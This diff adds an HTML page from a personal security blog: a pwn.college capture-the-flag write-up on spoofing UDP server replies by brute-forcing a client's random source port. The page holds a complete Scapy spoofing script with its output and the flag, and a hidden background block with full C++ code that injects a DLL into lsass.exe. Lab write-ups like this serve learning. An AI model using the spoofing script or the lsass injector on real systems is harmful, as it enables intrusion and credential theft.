@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛰️ UDP Spoofing 3 – Writeup (pwn.college)</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🛰️ UDP Spoofing 3 – Writeup (pwn.college)" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🛰️ UDP Spoofing 3 – Writeup (pwn.college)</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-summary">📌 Challenge Summary</h2>
+
+<blockquote>
+  <p>In this level, spoofing becomes trickier: the source port used by the client is <strong>no longer fixed</strong>. This mimics real-world DNS vulnerabilities, where attackers exploited predictable port values to forge responses. The patch? Randomizing ports. Your goal is to <strong>guess the correct source port</strong> and <strong>trick the client into thinking a spoofed server replied with a flag</strong>.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-understanding-the-setup">🧠 Understanding the Setup</h2>
+
+<p>There are 3 main entities:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Server (10.0.0.3)</code> → Listens on UDP port <code class="language-plaintext highlighter-rouge">31337</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Client (10.0.0.2)</code> → Sends to server, receives a response, and may relay a flag to another host</li>
+  <li><code class="language-plaintext highlighter-rouge">You (Attacker @ 10.0.0.1)</code> → Want to <strong>spoof a server</strong> response and steal the flag</li>
+</ul>
+
+<p><strong>Key part:</strong></p>
+<ul>
+  <li>The client <strong>randomizes</strong> the port it uses to contact the server (just like secure DNS today).</li>
+  <li>The spoofed server reply must be sent <strong>to the correct ephemeral source port</strong>.</li>
+  <li>If successful, the client reads the spoofed message (e.g., <code class="language-plaintext highlighter-rouge">FLAG:10.0.0.1:12345</code>) and sends the real flag to the attacker’s IP.</li>
+</ul>
+
+<hr />
+
+<h2 id="-how-we-exploit-it">🔍 How We Exploit It</h2>
+
+<h3 id="-challenge">🔒 Challenge:</h3>
+<p>You don’t know the client’s source port. But it is:</p>
+<ul>
+  <li>In the <strong>ephemeral port range</strong>, typically <code class="language-plaintext highlighter-rouge">49152–65535</code></li>
+  <li>Fixed <strong>per socket</strong>, so if you spoof enough ports, you’ll eventually hit the right one</li>
+</ul>
+
+<hr />
+
+<h2 id="-attack-plan">🧪 Attack Plan</h2>
+
+<ol>
+  <li><strong>Sniff</strong> incoming UDP packets to attacker port (<code class="language-plaintext highlighter-rouge">12345</code>)</li>
+  <li><strong>Send forged responses</strong> to <code class="language-plaintext highlighter-rouge">10.0.0.2</code> (the client) spoofed as <code class="language-plaintext highlighter-rouge">10.0.0.3</code> (the server)</li>
+  <li><strong>Cycle through all possible ports (49152–65535)</strong> as the destination (i.e., client’s source)</li>
+  <li>Once you hit the right port → client sends the real flag to your listener</li>
+</ol>
+
+<hr />
+
+<h2 id="-final-exploit--new_spoofpy">💣 Final Exploit – <code class="language-plaintext highlighter-rouge">new_spoof.py</code></h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="n">send</span><span class="p">,</span> <span class="n">sniff</span><span class="p">,</span> <span class="n">IP</span><span class="p">,</span> <span class="n">UDP</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="n">attacker_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.1</span><span class="sh">'</span>
+<span class="n">attacker_port</span> <span class="o">=</span> <span class="mi">12345</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.2</span><span class="sh">'</span>
+<span class="n">spoofed_src_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.3</span><span class="sh">'</span>
+
+<span class="n">found_flag</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">udp_req</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">found_flag</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Starting to send spoofed responses...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">49152</span><span class="p">,</span> <span class="mi">65536</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">found_flag</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="n">pkt</span> <span class="o">=</span> <span class="nc">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">spoofed_src_ip</span><span class="p">)</span><span class="o">/</span><span class="nc">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">i</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="mi">31337</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">FLAG:</span><span class="si">{</span><span class="n">attacker_ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">attacker_port</span><span class="si">}</span><span class="sh">'</span>
+        <span class="nf">send</span><span class="p">(</span><span class="n">pkt</span><span class="o">/</span><span class="n">payload</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Finished sending spoofed packets.</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sniffer</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">found_flag</span>
+
+    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">found_flag</span>
+        <span class="k">if</span> <span class="n">pkt</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">UDP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">UDP</span><span class="p">].</span><span class="n">dport</span> <span class="o">==</span> <span class="n">attacker_port</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Flag captured!</span><span class="sh">"</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Data: </span><span class="si">{</span><span class="nf">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">UDP</span><span class="p">].</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">pkt</span><span class="p">.</span><span class="nf">show</span><span class="p">()</span>
+            <span class="n">found_flag</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Sniffing for incoming flag response...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">udp and port </span><span class="si">{</span><span class="n">attacker_port</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">handle</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">sniffer</span><span class="p">)</span>
+    <span class="n">t</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+    <span class="nf">udp_req</span><span class="p">()</span>
+    <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="output">Output</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing <span class="k">for </span>incoming flag response...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting to send spoofed responses...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Flag captured!
+Data: b<span class="s1">'pwn.college{gGcSubLJQ-zf9ij0zlp1LQOwXsf.0lN0AjNxwSM0IzMyEzW}\n'</span>
+...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finished sending spoofed packets.
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{gGcSubLJQ-zf9ij0zlp1LQOwXsf.0lN0AjNxwSM0IzMyEzW}
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
